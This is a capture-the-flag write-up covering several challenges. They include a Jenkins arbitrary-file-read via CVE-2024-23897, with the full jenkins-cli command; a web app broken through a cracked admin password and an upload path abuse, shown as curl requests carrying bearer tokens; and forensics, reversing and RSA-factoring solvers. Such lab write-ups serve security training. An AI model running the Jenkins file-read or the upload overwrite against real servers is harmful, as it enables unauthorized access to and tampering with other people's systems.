# jankin-jenkins

The website requires some sort of auth, so after fiddling around a bit with LFI for that file, I managed to get to a not-found page within Jenkins which showed the version. After googling the version, we can see it is vulnerable to that CVE, which allows us to read arbitrary files.

Getting the jenkins-cli.jar file from `/jnlpJars/jenkins-cli.jar` will allow us to use this vuln ([https://www.hackthebox.com/blog/cve-2024-23897]) to read files. While reading various filenames and directories, we eventually stumble at `/home/flag.txt`, which holds the flag `java -jar ./jenkins-cli.jar -s http://34.141.126.212:31878 connect-node '@/home/flag.txt'`.

1. 2.441
2. CVE-2024-23897
3. CTF{a36f507ff69287bf3f49261f065167bb077d061b3d0d0d11d70b53b3ed3537d1}

# hunting-phantom-traffic

1. mimikatz.exe - first HTTP request
2. 192.168.100.46 - dest IP for the previous HTTP request
3. payment.txt - filter for tcp.port == 4444
4. ftpuser:ftpuser - filter for ftp
5. c6627f8c7d95d75cc8d2140c63e25d35a28c3df1fdc4c2969694174a771118f2 - last HTTP request - get file bytes and get their sha

# secret_antidote

After some analysis and trying to reconstruct the file system based on the pcap, I decided to go back to basics.
Run `strings` and observe weird patterns of `-`, `.` and ` `, which leads to thinking of morse code.
Get all such strings and decode them: `.-- . .- .-. . -- --- ...- .. -. --. .- - -.. .- .-- -. --..-- - .... . -.- . -.-- ..-. --- .-. - .... . .- -. - .. -.. --- - . .. ... ---... --. --- .-.. ..-. --- ... -.-. .- .-. --- ... -.-. .- .-. -.. . .-.. - .- -. --- ...- . -- -... . .-. .. -. -.. .. .- --. --- .-.. ..-. .... --- - . .-.. - .- -. --. --- --. --- .-.. ..-. --- ... -.-. .- .-. --- ... -.-. .- .-. -.. . .-.. - .- .-.. .. -- .- ..- -. .. ..-. --- .-. -- -.-. .... .- .-. .-.. .. . -.- .. .-.. ---`. That will yield four words using the military alphabet, which you need to get the sha256 of by joining them with `-`.

Flag: `ctf{9f19fa2836c4a78da54cd418feca82365801f86694fca777a3fd8f9c7dfb5d13}`


# aligator

First part - analyzing the files, we see that there's a route `/api/flag` which will give us the first part of the flag. For that, we have to be authenticated. Looking at the `db.ts` file, we see that we have the hash of the admin password over there, and a quick search yields the password `lilulilucrocodilu`. After logging in, get the token and curl the flag.
`curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsImVtYWlsIjoiYWRtaW5AY3JvY28ubGFuZCIsImlhdCI6MTc0MzE4OTU0NywiZXhwIjoxNzQzMjc1OTQ3fQ.UMQHtt5lpUHo3ANGGrlCrTK7Eb85JWWf1JeUibCRAZ8' http://34.89.160.63:31567/api/flag
` -> `CTF{26c706769eaff944ad69e6dc05`

Second part - digging deeper into files, we see an `/admin/flag` route, which will give us the second part of the flag, if some conditions are met. Deobfuscating the TS in there, we get that the file `/app/.gitingore` must have `crocoLUMA` inside of it as text. Seeing as we need to modify some files, I started looking into the upload functionality, which allows us to upload only files whose names end in `.mp4`. Digging further, this route also takes a path as a parameter, and will use that if it exists, if and only if the filename is `.gitignore`. That's exactly what we need, thus, creating a dummy file with `crocoLUMA` inside, naming it as an `.mp4` and uploading it at `/.gitignore` does the trick.
`curl -F "file=@dummy.mp4" -F "path=/.gitignore" http://34.159.137.2:32627/api/admin/upload -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsImVtYWlsIjoiYWRtaW5AY3JvY28ubGFuZCIsImlhdCI6MTc0MzE5MTk4MCwiZXhwIjoxNzQzMjc4MzgwfQ.Z9NeYkeY-oFZrDxvF2OsYQAI6Ske7LmeDV4tSRiy8fY'
` -> `curl http://34.159.137.2:32627/admin/flag -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsImVtYWlsIjoiYWRtaW5AY3JvY28ubGFuZCIsImlhdCI6MTc0MzE5MTk4MCwiZXhwIjoxNzQzMjc4MzgwfQ.Z9NeYkeY-oFZrDxvF2OsYQAI6Ske7LmeDV4tSRiy8fY'
` -> `8d37c8ce4254a2e93b06cddd75d6fc58ca6f38}`

Putting the two parts together yields the flag.

Flag: `CTF{26c706769eaff944ad69e6dc058d37c8ce4254a2e93b06cddd75d6fc58ca6f38}`

# simple-go

Reversing challenge, where we are given an ARM MACOS binary. After fiddling with it a bit in Ghidra, we can see that it asks for user input, then decodes the flag and checks it against what the user has given. For decoding the flag, it just XOR decodes it with a 6 byte XOR key (`if` condition for the key breaks if it is bigger than 5, and also that magic number is a modulo trick for doing % 6). Though analyzing the compiled code doesn't really yield good offsets, so we move to assembly. We see that the code for the key actually reads it from `sp-0x80 + 0x2d` rather than what the decompilation says (`sp-0x80 + 0x35`)(`10009a3d8 e7  b7  00  91    add        x7,sp,#0x2d`), thus, after endianness, the key is taken to be as `1337deadbeef` (`puVar1 + -0x53`). Similar approach was taken to observe that the ciphertext starts at `sp-0x80+0x33`, rather than `sp-0x80+3b` as in the decompiled code (`10009a418 e5  cf  00  91    add        x5,sp,#0x33`) (`puVar1 + -0x4d`). By getting the ciphered text and accounting for endianness and XORing it with the key, the flag is revealed.


```Python
key = bytes([0x13, 0x37, 0xde, 0xad, 0xbe, 0xef])
ciphertext = bytes([
    0x50, 0x63, 0x98, 0xd6, 0x88, 0xdf, 0x2b, 0x56,
    0xe9, 0xcc, 0x8e, 0xd7, 0x22, 0x03, 0xe8, 0xcc,
    0x8d, 0xdc, 0x27, 0x56, 0xbf, 0xc9, 0x8d, 0xd8,
    0x77, 0x03, 0xbd, 0x9a, 0x8b, 0xde, 0x71, 0x07,
    0xef, 0xcf, 0x86, 0xda, 0x27, 0x52, 0xbb, 0x9c,
    0xdb, 0xdb, 0x21, 0x52, 0xe6, 0x9f, 0x8b, 0xdb,
    0x77, 0x04, 0xbf, 0x9d, 0x8e, 0xdb, 0x2b, 0x54,
    0xe8, 0x9e, 0x87, 0x8b, 0x22, 0x53, 0xba, 0xcb,
    0x87, 0x8a, 0x2b, 0x0e, 0xa3
])


plaintext = bytearray(69)
for i in range(69):
    plaintext[i] = ciphertext[i] ^ key[i % 6]
as_str = plaintext.decode("utf-8")
print("Flag:", as_str)
```

Flag: `CTF{608a7a08146a334aad37d4c751b01b854ee1e42e8254d3a0048c639d1ddf9e89}`

# ai-sincs

We are given an elf memory dump, so up to volatility it goes.

1. `ChatGPT` (`.\vol.py -f ..\Challenge.elf windows.pslist`)
2. `pipic5589@gmail.com` (just search for the text @gmail.com in the memory dump)
3. `CTF{7f207508e2f0dcf5b5431447b9d661cb0edc96b5527ae76c38e2a0663d1a9bda}`
For 3, multiple steps were required.
First, I started by analyzing the memory and started looking for the flag, but that yielded nothing. Next, since the challenge is about ChatGPT, I obtained all the handles of the process and looked for interesting stuff (`.\vol.py -f ..\Challenge.elf windows.handles --pid 6852`). I found there some interesting LevelDB databases, and dropping them (using `windows.dumpfiles`), we eventually find some Conversation histories with ChatGPT (`0x800751c92710  \Users\vboxuser\AppData\Local\Packages\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\LocalCache\Roaming\ChatGPT\IndexedDB\https_chatgpt.com_0.indexeddb.leveldb\000003.log`). In there, our guy is talking with ChatGPT, and towards the end he asks him about some encoded thingy he had found - `INKEM6ZXMYZDANZVGA4GKMTGGBSGGZRVMI2TIMZRGQ2DOYRZMQ3DMMLDMIYGKZDDHE3GENJVGI3WCZJXGZRTGODFGJQTANRWGNSDCYJZMJSGC7I`. That string looks oddly like base32. Decoding it as such yields the flag.
4. `29f1ced5-984f-4be6-b493-a07fc1c204ae` (just search for `session.*29` in strings)

# my-speciality

Running the binary, we see that it prints out n, e and c, which are typical in RSA challenges, thus we will have to find a way to break the way the primes are made and get back the encrypted message.

Analyzing the binary, we see that it creates two primes `p` and `q`, which have a specific form, namely `p = a^2 + r_p, with r_p = 1337` and `q = b^2 + r_q, with r_q = 3317`. After some debugging to ensure that this is actually what's happening and trying to understand what that Rust code is doing, since somehow the decompilation pointed towards the second prime not being used (IDA being IDA I guess), I ended up that the only thing we can attack is that prime form. 

My initial guess was to try Coppersmith's method for finding the small rots of the bivariate equation `(a^2 + r_p) * (b^2 + r_q) - n - r_p * r_q`, but that failed since the bounds for checking were astronomically high and Sage couldn't cope (n ~ 2048 bits => p, q ~ 1024 bits). After that, I went to do some research on this prime form, and I eventually ended at the following paper, which specifically targets such primes: [http://psasir.upm.edu.my/id/eprint/76375/1/8.pdf] - Ghafar, A. H. A., Ariffin, M. R. K., & Asbullah, M. A. (2019). A new attack on special-structured RSA primes. Malaysian Journal of Mathematical Sciences, 13, 111-125.

Implementing the algorithm there yields the correct factors. Getting the `n` value from the service and into the script yields `p` and `q`, which were then used to decrypt the given `c`.

```Python
from sage.all import *

def factor_special_rsa(N, rp, rq, m):
    i = Integer(ceil(sqrt(rp * rq)))
    limit = Integer(floor(rq / 2 + 2 ** (m / 2 - 1) * rp + 1))
    
    while i < limit:
        sigma = Integer((floor(sqrt(N)) - i) ** 2)
        z = (N - rp * rq) % sigma
        disc = z * z - 4 * sigma * rp * rq
        if disc >= 0:
            if disc.is_square():
                x_1 = (z + sqrt(disc)) / 2
                x_2 = (z - sqrt(disc)) / 2
                test_1 = (x_1 / rq + rp)
                test_2 = (x_2 / rp + rq)
                if N % test_1 or N % test_2:
                    i += 1
                    continue
                else:
                    return test_1, test_2
            else:
                i += 1
                continue
        else:
            i += 1
            continue

    return None, None

N = Integer(10828976420710067897882902423603844264720684969434180737100703477004437587949955122387470244881167567947499957766066889340837989865322798819970357861066204528263604382516556068943231751203635212111708471879554872426433409983734848039961719624097708620767435538769494262083493677735982882996335307095199723337810914009484049452972480123138699942393803134729776825945241230949750194456358272255464542302859639716884893756624333379351335633828933064312245870355232967609242150612635753449701370174032906753708041965884612114368314867357503966822930172715482164016578388318345960390765617162942593251205346649835035259409)
rp = 1337
rq = 3317
m = 2

p, q = factor_special_rsa(N, rp, rq, m)

if p and q:
    print("Found factors:")
    print("p =", p)
    print("q =", q)
else:
    print("Factors not found :(")

```

Getting the factors from there and testing them yields that they correctly factor `n`. From there, just get `d = e^-1 (mod phi(n))` (where `phi(n) = (p - 1) * (q - 1)`) and get back the message by doing (`c^d mod n`).

```Python
>>> n = 10828976420710067897882902423603844264720684969434180737100703477004437587949955122387470244881167567947499957766066889340837989865322798819970357861066204528263604382516556068943231751203635212111708471879554872426433409983734848039961719624097708620767435538769494262083493677735982882996335307095199723337810914009484049452972480123138699942393803134729776825945241230949750194456358272255464542302859639716884893756624333379351335633828933064312245870355232967609242150612635753449701370174032906753708041965884612114368314867357503966822930172715482164016578388318345960390765617162942593251205346649835035259409
>>> p = 106872348643894730509410334007085421462436519185903282656328215244928921968689910051658896015714735283068505266867844815745990213536217068423412403284816389887532809733024013220036281240733121339072855493619039178011028419823244481651803854994543945508589774298443693532128707496811205541909840438319301151133
>>> q = 101326269686398363631307085310237069193767391023902489866665784708402982039834148521214905461425440175646143782655609133713332863333088256039665917933381233239150825647743806848829326847159311847387508683513896251965497434192262081839387007501252563558173634532930932317425761772630710815455173432164632979973
>>> p * q == n
True
>>> phi = (p - 1) * (q - 1)
>>> d = pow(0x10001, -1, phi)
>>> c = 7906922647509585707168512335316124497939209062695109084406782297566660414906436584975814185503552997508176738518366717978243865641283976715735974779497093321848787021494058451376702275039468325060054993161508996134093161469132449161789101368918439604828334505910169714501821689016029613559736535493897261397794399623051830638854439555359355500966622484973925212718559114634398700021473791074609514833507870078751765475684713144191366561111585210740228324334091230907903794740605280759182213599258177132932060781614803545355727871979915382239401830471318691392581705864055228706430238392305552181867067708085748045757
>>> from Crypto.Util.number import long_to_bytes as l2b
>>> l2b(pow(c, d, n)).decode()
'CTF{0d72410351d9e57b46921d62dd8789cd66d704b713bb720c217f58a96e1204e8}\n'
>>>
```

Flag: `CTF{0d72410351d9e57b46921d62dd8789cd66d704b713bb720c217f58a96e1204e8}`

# secretBook

We are presented with 3 files. An ELF binary, a zip archive with some photos and a wordlist, and a seemingly encrypted file.
Analyzing the ELF, it is a PyInstaller archive. Using pyinstxtractor-ng on it yields the pyc, which is then fed into PyLingual to reveal the following Python code:


```Python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: open_book_app.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import sys
import os
wordlist_file = 'inspiration.txt'
input_file = 'my_secret_book_draft.secure'
output_file = 'my_secret_book_draft.txt'

def load_wordlist(wordlist_file):
    """Load words from the wordlist file into a list."""  # inserted
    if not os.path.isfile(wordlist_file):
        print('I must find my inspiration')
        sys.exit(1)
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as f:
            words = [line.strip() for line in f if line.strip()]
            return words
    except FileNotFoundError:
        print(f'Error: {wordlist_file} not found.')
        sys.exit(1)

def xor_file_with_words(input_file, words, order):
    """XOR file content with words from the list in the specified order."""  # inserted
    try:
        with open(input_file, 'rb') as f:
            data = f.read()
        xored_data = data
        for idx in order:
            word = words[idx]
            word_bytes = word.encode('utf-8')
            word_bytes_repeated = word_bytes * (len(xored_data) // len(word_bytes) + 1)
            xored_data = bytes((d ^ k for d, k in zip(xored_data, word_bytes_repeated[:len(xored_data)])))
        return xored_data
    except FileNotFoundError:
        print(f'Error: {input_file} not found.')
        sys.exit(1)

def save_output_to_file(output_data, output_file):
    """Save the XOR result to a text file."""  # inserted
    try:
        with open(output_file, 'wb') as f:
            f.write(output_data)
        print(f'Decrypted output saved to {output_file}')
    except IOError as e:
        print(f'Error saving to {output_file}: {e}')
        sys.exit(1)

if __name__ == '__main__':
    if not os.path.isfile(wordlist_file):
        print('I must find my inspiration')
        sys.exit(1)
    order_input = input('Please provide a list: ')
    try:
        order = [int(i) for i in order_input.split(',')]
        words = load_wordlist(wordlist_file)
        if any((idx >= len(words) for idx in order)):
            print('Error: Order indices exceed available words in wordlist.')
            sys.exit(1)
        decrypted_data = xor_file_with_words(input_file, words, order)
        save_output_to_file(decrypted_data, output_file)
    except ValueError:
        print('Error: Invalid input. Please provide a comma-separated list of integers.')
        sys.exit(1)
```

We see that it is a decryptor for our encrypted file, by getting specific words from that wordlist and XORing them with the data in the order given, but since XOR is symmetric and commutative, the order doesn't really matter, just the actual words used. So, I started looking at the other files, the photos. They seem not modified, except two photos which have added comments (obtained from `exiftool`).

```
XP Comment                      : AI prompt: The kite flew by the lighthouse as the dolphin swam near the waterfall,
XP Comment                      : AI prompt: while the rainbow arched over the jungle with one parrot flying above.
```

In here, I started trying various ways to combine them, reverse them, keep only some words from them, even brute force a bit, all to no avail.
Then, I decided to try and shift those indices, and see maybe that'll work, since there is a photo named `perhaps_you_should_start_from_this_iteration`, so after the time I spent bruteforcing, I said why not.

Apparently, doing this yields the right key and decrypts the file.

```Python
wordlist_file = 'inspiration.txt'
input_file = 'my_secret_book_draft.secure.old'

def xor_file_with_words(data, words, order):
    xored_data = data
    for idx in order:
        word = words[idx]
        word_bytes = word.encode('utf-8')
        word_bytes_repeated = word_bytes * (len(xored_data) // len(word_bytes) + 1)
        xored_data = bytes((d ^ k for d, k in zip(xored_data, word_bytes_repeated[:len(xored_data)])))
    return xored_data

if __name__ == '__main__':
    with open(wordlist_file, 'r', encoding='utf-8') as f:
            words = [line.strip() for line in f if line.strip()]
    words_in = "The Kite Flew By The Lighthouse As The Dolphin Swam Near The Waterfall While The Rainbow Arched Over The Jungle With One Parrot Flying Above"
    indices_list = [words.index(word.strip()) for word in words_in.split(" ") if word]
    with open(input_file, 'rb') as f:
        data = f.read()
    xored_data = data
    for r in range(-20, 50, 1):
        order = [x - r for x in indices_list]
        
        if any((idx >= len(words) for idx in order)):
            continue
        decrypted_data = xor_file_with_words(xored_data, words, order)
        try:
            print(decrypted_data.decode())
            break
        except UnicodeDecodeError:
            pass
```

Flag: `ctf{8d3acd89dd7a20a18f8a6821a5e4549bac67cfe91d2da09a9ffad957cfc4cee4}`